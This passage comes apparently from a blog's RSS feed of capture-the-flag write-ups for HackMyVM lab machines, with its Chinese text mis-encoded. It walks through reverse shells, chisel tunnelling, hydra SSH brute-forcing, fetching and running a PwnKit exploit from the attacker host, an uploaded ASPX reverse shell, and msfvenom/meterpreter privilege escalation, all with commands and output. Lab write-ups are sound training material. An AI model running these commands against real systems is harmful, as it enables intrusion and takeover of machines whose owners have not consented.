å¼€å¯ç›‘å¬ å‘åŒ… åå¼¹shell<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201120703.png" referrerpolicy="no-referrer"><br><br>è¿›æ¥åä¼šå‘ç°è‡ªå·±æ˜¯rootæƒé™<br>
ä½†å…¶å®æ˜¯åœ¨dockeré‡Œé¢<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201120834.png" referrerpolicy="no-referrer"><br>
å¯ä»¥åœ¨æ ¹ç›®å½•çœ‹åˆ°æœ‰ä¸€ä¸ª .dockerenv æ–‡ä»¶ã€‚è¿™å°±æ˜¯åœ¨å®¹å™¨é‡Œé¢çš„ç‰¹å¾ä¹‹ä¸€<br>ä¸Šä¼  <a class="internal-link" data-href="../../26-å·¥å…·ä½¿ç”¨/CDKä½¿ç”¨.md" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/cdkä½¿ç”¨.html" target="_self" rel="noopener nofollow">cdk</a> è¿›è¡Œæ£€æµ‹<br>å…ˆçœ‹ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬<br>(remote) root@8b39a559b296:/tmp# uname -a
Linux 8b39a559b296 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 GNU/Linux
<br>è¯•äº†å¥½å‡ ä¸ªå‘ç°éƒ½ä¸èƒ½æˆåŠŸï¼Œè¿˜æ˜¯åœ¨çœ‹çœ‹å…¶ä»–åˆ©ç”¨ç‚¹å§<br>çœ‹ä¸€ä¸‹å†å²è®°å½•<br>history
<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241201135010.png" referrerpolicy="no-referrer"><br>
è¿™é‡Œé¢å¯ä»¥çœ‹åˆ°å®¹å™¨è¿›è¡Œäº†ä¸€ä¸ªå†…ç½‘çš„sshè¿æ¥ ç”¨æˆ·åæ˜¯ ramsey IPæ˜¯ 172.17.0.1<br>
è¿™ä¸ªipå¯èƒ½å°±æ˜¯ä¸»æœºIP <br>æˆ‘ä»¬å°è¯•è¿›è¡Œsshè¿æ¥ä¸€ä¸‹<br>(remote) root@8b39a559b296:/tmp# ssh ramsey@172.17.0.1
bash: ssh: command not found
<br>å‘ç°å®¹å™¨å¹¶æ²¡æœ‰å®‰è£…sshã€‚ å¯èƒ½æ˜¯å·²ç»æ¯å¸è½½äº†<br>ä½†æ˜¯ä¸»æœºæ˜¯ä¸æ˜¯å¼€æ”¾äº† sshæœåŠ¡è¿™å¯¹æˆ‘ä»¬ååˆ†é‡è¦<br>
åœ¨å¼€å§‹è¿›è¡Œç«¯å£æ‰«ææ—¶ å°±å¯ä»¥å‘ç°ä¸»æœºåªå¯¹å¤–å¼€æ”¾äº†5003ç«¯å£ å¹¶æ²¡æœ‰22ç«¯å£<br>
æˆ‘ä»¬çœ‹çœ‹ä¸»æœºå¯¹å†…å¼€æ”¾ä»€ä¹ˆç«¯å£<br>(remote) root@8b39a559b296:/tmp# nc -znv 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 5003 (?) open
(UNKNOWN) [172.17.0.1] 22 (ssh) open
<br>å¯ä»¥çœ‹åˆ°å¯¹å†…æ˜¯å¼€æ”¾äº†sshæœåŠ¡çš„<br><br>æ­¤æ—¶æˆ‘ä»¬çŸ¥é“äº†ä¸»æœº sshçš„ç”¨æˆ·åä¸ip<br>
é‚£ä¹ˆæˆ‘ä»¬è¿™æ—¶å€™åªéœ€è¦æ­å»ºä¸€ä¸ªå®¹å™¨ä¸kaliçš„éš§é“ï¼Œä½¿å¾—ä¸»æœºå¯ä»¥è®¿é—®å®¹å™¨å†…ç½‘ï¼Œç„¶ååœ¨kaliä¸Šè¿›è¡Œsshçˆ†ç ´å³å¯<br><br>ä½¿ç”¨kaliç»™å®¹å™¨ä¼ ä¸€ä¸ª<a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/chisel ä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/chisel ä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/chisel-ä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">chisel</a><br>kaliå¼€å¯åå‘ç›‘å¬<br>â”Œâ”€â”€(rootã‰¿kali)-[/home]
â””â”€# ./chisel server -p 9999 --reverse
2024/12/01 14:07:07 server: Reverse tunnelling enabled
2024/12/01 14:07:07 server: Fingerprint sP2BcLu3iBtJ8s51afwrmDlqpOsmsqVe64WNopPvgQM=
2024/12/01 14:07:07 server: Listening on http://0.0.0.0:9999

<br>å®¹å™¨è¿æ¥å¹¶é…ç½®åå‘ç«¯å£è½¬å‘<br>(remote) root@8b39a559b296:/tmp# ./chisel client 192.168.80.5:9999 R:8888:172.17.0.1:22
2024/12/01 06:09:54 client: Connecting to ws://192.168.80.5:9999
2024/12/01 06:09:54 client: Connected (Latency 799.51Âµs)

<br>è¿™æ—¶å€™è®¿é—®å°±å¯ä»¥é€šè¿‡kaliæœ¬åœ°çš„ 127.0.0.1:8888 è®¿é—®åˆ°å®¹å™¨çš„ 172.17.0.1:22<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/UnbakedPie]
â””â”€# hydra -l ramsey -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1:8888
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-01 14:12:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://127.0.0.1:8888/
[8888][ssh] host: 127.0.0.1   login: ramsey   password: 12345678

<br>æˆåŠŸè·å–åˆ°å¯†ç  12345678<br>sshè¿æ¥è·å–flag<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/UnbakedPie]
â””â”€# ssh ramsey@127.0.0.1 -p 8888
The authenticity of host '[127.0.0.1]:8888 ([127.0.0.1]:8888)' can't be established.
ED25519 key fingerprint is SHA256:B6SoW4WBwsc2n9NynSce9+R0E44T4YkZVRxD5y5Muhc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[127.0.0.1]:8888' (ED25519) to the list of known hosts.
ramsey@127.0.0.1's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


39 packages can be updated.
26 updates are security updates.


Last login: Sat Oct  3 22:15:57 2020 from 172.17.0.2


ramsey@unbaked:~$ cat user.txt
Unb4ked_W00tw00t

<br><br>ä½¿ç”¨ <a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/LZSä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/LZSä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/lzsä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">LZS</a> è¿›è¡Œææƒæ£€æµ‹<br>
å‘ç°å¯ä»¥ç”¨Pwnkitææƒ<br>
ç›´æ¥ææƒ<br>bash lzs.sh //ææƒæ£€æµ‹
wget http://192.168.80.5/main.tar.gz
tar -zxvf main.tar.gz
cd CVE-2021-4034-main/
make
./cve-2021-4034
<br>
pwncatä¸‹è½½çš„ mian é»˜è®¤æ˜¯zipå‹ç¼©çš„ã€‚ä½†æ˜¯é¶æœºä¸Šæ˜¯æ²¡æœ‰ unzip çš„æ‰€ä»¥è¦å…ˆåœ¨å¤–é¢è§£å‹ç„¶åç”¨taræ‰“åŒ… å†ä¼ ç»™é¶æœº
<br>root@unbaked:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(ramsey)
root@unbaked:/tmp# cat /root/root.txt
CONGRATS ON PWNING THIS BOX!
Created by ch4rm &amp; H0j3n
ps: dont be mad us, we hope you learn something new

flag: Unb4ked_GOtcha!

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/32.unbakedpie.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/32.UnbakedPie.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241128182147.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[31.quoted]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ftpåŒ¿å" data-href="#3. ftpåŒ¿å" href="https://www.c1trus.top/about:blank#3._ftpåŒ¿å" class="internal-link" target="_self" rel="noopener nofollow">3. ftpåŒ¿å</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=quoted" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=quoted</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=ysnmrtksk" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=ysnmrtksk" target="_blank">ysnmrtksk</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/ysnmrtksk]
â””â”€# fscan -h 192.168.56.21

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.21:135 open
192.168.56.21:21 open
192.168.56.21:139 open
192.168.56.21:445 open
192.168.56.21:80 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo
[*]192.168.56.21
   [-&gt;]quoted-PC
   [-&gt;]192.168.56.21
[*] OsInfo 192.168.56.21        (Windows 7 Professional 7601 Service Pack 1)
[+] ftp 192.168.56.21:21:anonymous
   [-&gt;]aspnet_client
   [-&gt;]iisstart.htm
   [-&gt;]welcome.png
[*] WebTitle http://192.168.56.21      code:200 len:689    title:IIS7
å·²å®Œæˆ 5/5
[*] æ‰«æç»“æŸ,è€—æ—¶: 1.434643461s

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/quoted]
â””â”€# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Microsoft FTP Service
Name (192.168.56.21:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; ls
229 Entering Extended Passive Mode (|||49179|)
125 Data connection already open; Transfer starting.
10-05-24  11:16AM       &lt;DIR&gt;          aspnet_client
10-04-24  11:27PM                  689 iisstart.htm
10-04-24  11:27PM               184946 welcome.png
226 Transfer complete.

ftp&gt; put shell.aspx
local: pass.asp remote: pass.asp
229 Entering Extended Passive Mode (|||49181|)
125 Data connection already open; Transfer starting.
100% |******************************************************|    27      432.24 KiB/s    --:-- ETA
<br>ä¸‹ä¸€ä¸ªaspxé©¬<br>
<a rel="noopener nofollow" class="external-link" href="https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx" target="_blank">https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx</a><br>
æ”¹ä¸‹ipç›‘å¬ç«¯å£ Putä¸Šå»<br>
ç„¶åå¼¹shell<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/quoted]
â””â”€# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Microsoft FTP Service
Name (192.168.56.21:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49185|)
125 Data connection already open; Transfer starting.
100% |******************************************************| 16394       87.34 MiB/s    --:-- ETA
226 Transfer complete.
16394 bytes sent in 00:00 (18.90 MiB/s)
ftp&gt; exit
221 Goodbye.

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/quoted]
â””â”€# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.56.6] from (UNKNOWN) [192.168.56.21] 49186
Spawn Shell...
Microsoft Windows [Sâ–’râ–’m 6.1.7601]
Telif Hakkâ–’ (c) 2009 Microsoft Corporation. Tâ–’m haklarâ–’ saklâ–’dâ–’r.

c:\windows\system32\inetsrv&gt;hostname
hostname
quoted-PC

c:\windows\system32\inetsrv&gt;

<br><br>æˆ‘ä»¬åˆ©ç”¨msfè¿›è¡Œææƒå³å¯ã€‚<br>
å…ˆæŠŠshellè½¬ç»™msf<br>ç”¨msfç”Ÿæˆä¸€ä¸ªåå‘shell<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/quoted]
â””â”€# msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.6 lport=7788 -f exe &gt; shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
<br>ä¸Šä¼ è¿™ä¸ªåå‘shellåˆ°é¶æœº<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/quoted]
â””â”€# ftp 192.168.56.21
Connected to 192.168.56.21.
220 Microsoft FTP Service
Name (192.168.56.21:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; put shell.exe
local: shell.exe remote: shell.exe
229 Entering Extended Passive Mode (|||49191|)
125 Data connection already open; Transfer starting.
100% |***********************************************| 74160       48.84 MiB/s    --:-- ETA
226 Transfer complete.
74160 bytes sent in 00:00 (38.22 MiB/s)

<br>msfå¼€å¯ç›‘å¬<br>msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.56.6
set lport 7788
run


meterpreter &gt; shell
Process 2040 created.
Channel 3 created.
Microsoft Windows [Sâ–’râ–’m 6.1.7601]
Telif Hakkâ–’ (c) 2009 Microsoft Corporation. Tâ–’m haklarâ–’ saklâ–’dâ–’r.

c:\Windows\Tasks&gt;whoami /priv
whoami /priv

AYRICALIK Bâ–’LGâ–’LERâ–’
----------------------

Ayrâ–’calâ–’k Adâ–’                 Aâ–’â–’klama                                                 Durum
============================= ======================================================== ==========
SeAssignPrimaryTokenPrivilege â–’â–’lem dâ–’zeyi belirtecini deâ–’iâ–’tir                        Devre Dâ–’â–’â–’
SeIncreaseQuotaPrivilege      â–’â–’lem iâ–’in bellek kotalarâ–’ ayarla                        Devre Dâ–’â–’â–’
SeSecurityPrivilege           Denetimi ve gâ–’venlik gâ–’nlâ–’â–’â–’nâ–’ yâ–’net                     Devre Dâ–’â–’â–’
SeShutdownPrivilege           Sistemi kapat                                            Devre Dâ–’â–’â–’
SeAuditPrivilege              Gâ–’venlik denetimleri oluâ–’tur                             Devre Dâ–’â–’â–’
SeChangeNotifyPrivilege       â–’apraz geâ–’iâ–’ denetimini atla                             Etkin
SeUndockPrivilege             Bilgisayarâ–’ takma biriminden â–’â–’kar                       Devre Dâ–’â–’â–’
SeImpersonatePrivilege        Kimlik doâ–’rulamasâ–’ndan sonra istemcinin â–’zelliklerini al Etkin
SeCreateGlobalPrivilege       Genel nesneler oluâ–’tur                                   Etkin
SeIncreaseWorkingSetPrivilege â–’â–’lem â–’alâ–’â–’ma kâ–’mesini artâ–’r                             Devre Dâ–’â–’â–’
SeTimeZonePrivilege           Saat dilimini deâ–’iâ–’tir                                   Devre Dâ–’â–’â–’

<br>å‘ç°å…·æœ‰ SeIncreaseWorkingSetPrivilege æƒé™<br>
ç›´æ¥ç”¨ GodPotato æˆ–è€… juicyPotao ææƒå³å¯<br>use exploit/windows/local/ms16_075_reflection_juicy
set session 1
set lhost 192.168.56.6
set lport 7788
run


msf6 exploit(windows/local/ms16_075_reflection_juicy) &gt; run

[*] Started reverse TCP handler on 192.168.56.6:7788
[+] Target appears to be vulnerable (Windows 7 Service Pack 1)
[*] Launching notepad to host the exploit...
[+] Process 1240 launched.
[*] Reflectively injecting the exploit DLL into 1240...
[*] Injecting exploit into 1240...
[*] Exploit injected. Injecting exploit configuration into 1240...
[*] Configuration injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 192.168.56.24
[*] Meterpreter session 2 opened (192.168.56.6:7788 -&gt; 192.168.56.24:49194) at 2024-12-24 07:48:21 -0500

meterpreter &gt; shell
Process 2240 created.
Channel 1 created.
Microsoft Windows [Sâ–’râ–’m 6.1.7601]
Telif Hakkâ–’ (c) 2009 Microsoft Corporation. Tâ–’m haklarâ–’ saklâ–’dâ–’r.

C:\Windows\system32&gt;whoami
whoami
nt authority\system


c:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
HMV{Elevated_Shell_Again}

c:\Users\quoted\Desktop&gt;type user.txt
type user.txt
HMV{User_Flag_Obtained}

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/31.quoted.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/31.quoted.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[30.runas]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ç½‘ç«™ä¿¡æ¯" data-href="#2.2. ç½‘ç«™ä¿¡æ¯" href="https://www.c1trus.top/about:blank#2.2._ç½‘ç«™ä¿¡æ¯" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç½‘ç«™ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2.3. ç›®å½•æ‰«æ" data-href="#2.3. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.3._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.3. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.4. rdpçˆ†ç ´" data-href="#2.4. rdpçˆ†ç ´" href="https://www.c1trus.top/about:blank#2.4._rdpçˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">2.4. rdpçˆ†ç ´</a>


<br><a data-tooltip-position="top" aria-label="3. å†è¯•ç½‘ç«™" data-href="#3. å†è¯•ç½‘ç«™" href="https://www.c1trus.top/about:blank#3._å†è¯•ç½‘ç«™" class="internal-link" target="_self" rel="noopener nofollow">3. å†è¯•ç½‘ç«™</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Runas" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Runas</a><br>
ä½œè€… ysnmrtksk<br>
éš¾åº¦ â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/runas]
â””â”€# fscan -h 192.168.56.20

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.20:139 open
192.168.56.20:135 open
192.168.56.20:80 open
192.168.56.20:445 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]192.168.56.20
   [-&gt;]runas-PC
   [-&gt;]192.168.56.20
[*] WebTitle http://192.168.56.20      code:200 len:251    title:Index of /
[*] OsInfo 192.168.56.20        (Windows 7 Professional 7601 Service Pack 1)
å·²å®Œæˆ 4/4
[*] æ‰«æç»“æŸ,è€—æ—¶: 1.348727278s

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/runas]
â””â”€# nmap 192.168.56.20 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 20:36 CST
Nmap scan report for 192.168.56.20
Host is up (0.00010s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:69:E0:90 (Oracle VirtualBox virtual NIC)

<br>æ²¡æœ‰åŸŸç¯å¢ƒ<br><br>é¦–é¡µ<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126203940.png" referrerpolicy="no-referrer"><br>
index.php<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126204004.png" referrerpolicy="no-referrer"><br>styles.css<br>body {
    font-family: Arial, sans-serif;
    background-color: #f4f4f4;
    margin: 0;
    padding: 0;
}

.container {
    max-width: 600px;
    margin: 50px auto;
    padding: 20px;
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    text-align: center;
}

h1 {
    color: #333;
    margin-bottom: 20px;
}

form {
    margin-bottom: 20px;
}

input[type="text"] {
    width: 80%;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 4px;
    margin-right: 10px;
}

button {
    padding: 10px 15px;
    background-color: #28a745;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
}

button:hover {
    background-color: #218838;
}

.output {
    margin-top: 20px;
    text-align: left;
}
<br>æ ¹æ®æç¤ºå¯ä»¥çœ‹å‡º index.php åº”è¯¥æ˜¯ä¼šæ¥å—ä¸€ä¸ª file å‚æ•°<br>
éšä¾¿æµ‹è¯•å‡ ä¸‹ã€‚çœ‹çœ‹å­˜ä¸å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/runas]
â””â”€# curl 'http://192.168.56.20/index.php?file=C:\Users\Public\desktop.ini'
&lt;!DOCTYPE html&gt;
&lt;html lang="tr"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Nothing Here&lt;/title&gt;
    &lt;link rel="stylesheet" href="styles.css"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;h1&gt;There is no going back!&lt;/h1&gt;
        &lt;h2&gt;?file=&lt;/h2&gt;
        &lt;div class="output"&gt;
            &lt;pre&gt;&lt;/pre&gt;        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/runas]
â””â”€# curl http://192.168.56.20/index.php?file=C:\Users\Public\kjdaljdklajls
&lt;!DOCTYPE html&gt;
&lt;html lang="tr"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Nothing Here&lt;/title&gt;
    &lt;link rel="stylesheet" href="styles.css"&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="container"&gt;
        &lt;h1&gt;There is no going back!&lt;/h1&gt;
        &lt;h2&gt;?file=&lt;/h2&gt;
        &lt;div class="output"&gt;
            File not found!        &lt;/div&gt;
    &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;

<br>å¯ä»¥å‘ç°è¿™ä¸ªåªèƒ½åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/runas]
â””â”€# dirsearch -u http://192.168.56.20/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/hmv/runas/reports/http_192.168.56.20/__24-11-26_20-50-45.txt

Target: http://192.168.56.20/

[20:50:45] Starting:
[20:50:45] 403 -  199B  - /%C0%AE%C0%AE%C0%AF
[20:50:45] 403 -  199B  - /%3f/
[20:50:45] 403 -  199B  - /%ff
[20:50:45] 403 -  199B  - /.ht_wsr.txt
[20:50:46] 403 -  199B  - /.htaccess.bak1
[20:50:46] 403 -  199B  - /.htaccess.orig
[20:50:46] 403 -  199B  - /.htaccess.save
[20:50:46] 403 -  199B  - /.htaccess_extra
[20:50:46] 403 -  199B  - /.htaccessBAK
[20:50:46] 403 -  199B  - /.htaccessOLD2
[20:50:46] 403 -  199B  - /.htaccess_sc
[20:50:46] 403 -  199B  - /.htm
[20:50:46] 403 -  199B  - /.html
[20:50:46] 403 -  199B  - /.htaccess.sample
[20:50:46] 403 -  199B  - /.htaccess_orig
[20:50:46] 403 -  199B  - /.htaccessOLD
[20:50:46] 403 -  199B  - /.htpasswds
[20:50:46] 403 -  199B  - /.httr-oauth
[20:50:46] 403 -  199B  - /.htpasswd_test
[20:50:52] 403 -  199B  - /cgi-bin/
[20:50:52] 500 -  530B  - /cgi-bin/printenv.pl
[20:50:57] 200 -  414B  - /index.php
[20:50:57] 200 -  414B  - /index.pHp
[20:50:57] 200 -  414B  - /index.php/login/
[20:50:57] 200 -  414B  - /index.php.
[20:50:57] 403 -  199B  - /index.php::$DATA
[20:51:06] 403 -  199B  - /Trace.axd::$DATA
[20:51:08] 403 -  199B  - /web.config::$DATA

<br>æ‰«å‡ºæ¥ä¸€ä¸ªç™»å½•è·¯å¾„ /index.php/login/<br>
è¿›æ¥è¿˜æ˜¯è¿™ä¸ª<br>
<img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126210046.png" referrerpolicy="no-referrer"><br>è¯•ä¸€ä¸‹è¿œç¨‹æ–‡ä»¶åŒ…å«<br>http://192.168.56.20/index.php/login/?file=http://192.168.56.6/1.txt
<br><img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241126210445.png" referrerpolicy="no-referrer"><br>
å¤±è´¥äº†<br>
### 2.4. SMBç©ºä¼šè¯æ£€æµ‹
é¶æœºå¼€æ”¾äº†SMB çš„ç«¯å£ 445 ä¸139
```bash
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/runas]
â””â”€# smbmap -u anonymous -H 192.168.56.20

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)

